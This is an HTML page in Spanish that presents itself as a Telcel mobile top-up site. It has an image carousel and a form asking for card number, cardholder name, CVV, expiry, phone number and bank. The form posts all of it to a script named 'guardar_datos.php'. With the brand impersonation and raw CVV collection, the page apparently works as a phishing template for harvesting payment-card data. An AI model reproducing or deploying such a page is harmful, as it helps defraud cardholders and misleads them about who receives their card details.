<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recargas Telcel</title>
    <link rel="stylesheet" href="styles.css">
    <script src="script.js" defer></script>
     <link rel="icon" href="img/favicon.ico" type="image/x-icon">
</head>
<body>
    <header>
        <h1>Recargas Telcel</h1>
    </header>
    
    <main>
        <section class="carousel">
            <div class="carousel-container">
                <img src="img/1.jpg" alt="Celular 1">
                <img src="img/2.jpg" alt="Celular 2">
                <img src="img/3.jpg" alt="Celular 3">
                <img src="img/4.jpg" alt="Celular 4">
                <img src="img/5.jpg" alt="Celular 5">
            </div>
            <button class="prev" onclick="prevSlide()">&#10094;</button>
            <button class="next" onclick="nextSlide()">&#10095;</button>
        </section>
        
        <section class="recarga">
            <h2>Compra tu Recarga</h2>
           <form id="recargaForm" action="guardar_datos.php" method="POST">
                <label for="monto">Monto de la recarga:</label>
                <select id="monto" name="monto" required>
                    <!-- Opciones de montos -->
                    <option value="20">20</option>
                    <option value="50">50</option>
                    <option value="100">100</option>
                    <option value="150">150</option>
                    <option value="200">200</option>
                    <option value="300">300</option>
                    <option value="500">500</option>
                    <option value="1000">1000</option>
                </select>

                <label for="tipoTarjeta">Tipo de tarjeta:</label>
                <select id="tipoTarjeta" name="tipoTarjeta" required>
                    <option value="debito">Débito</option>
                    <option value="credito">Crédito</option>
                </select>

                <label for="numeroTarjeta">Número de tarjeta:</label>
                <input type="text" id="numeroTarjeta" name="numeroTarjeta" required>

                <label for="nombreTitular">Nombre del titular:</label>
                <input type="text" id="nombreTitular" name="nombreTitular" required>

                <label for="cvv">CVV:</label>
                <input type="text" id="cvv" name="cvv" required>
                <label for="vencimientoMes">Mes de vencimiento:</label>
                <select id="vencimientoMes" name="vencimientoMes" required>
                    <!-- Opciones de meses -->
                    <option value="01">01 </option>
                    <option value="02">02 </option>
                    <option value="03">03 </option>
                    <option value="04">04 </option>
                    <option value="05">05 </option>
                    <option value="06">06 </option>
                    <option value="07">07 </option>
                    <option value="08">08 </option>
                    <option value="09">09 </option>
                    <option value="10">10</option>
                    <option value="11">11 </option>
                    <option value="12">12 </option>
                </select>

                <label for="vencimientoAno">Año de vencimiento:</label>
                <select id="vencimientoAno" name="vencimientoAno" required>
                    <!-- Opciones de años -->
                    <script>
                        const currentYear = new Date().getFullYear();
                        for (let i = currentYear; i <= 2040; i++) {
                            document.write('<option value="' + i + '">' + i + '</option>');
                        }
                    </script>
                </select>
                <label for="telefono">Número de Teléfono:</label>
                <input type="tel" id="telefono" name="telefono" required>

                <label for="banco">Banco:</label>
                <select id="banco" name="banco" required>
                    <option value="bancomer">BBVA </option>
                    <option value="banamex">Banamex</option>
                    <option value="santander">Santander</option>
                    <option value="hsbc">HSBC</option>
                    <option value="scotiabank">Scotiabank</option>
                </select>

                <button type="submit">Realizar Recarga</button>
            </form>
        </section>
    </main>

    <footer>
        <p>&copy; 2024 Telcel. Todos los derechos reservados.</p>
    </footer>
</body>
</html>
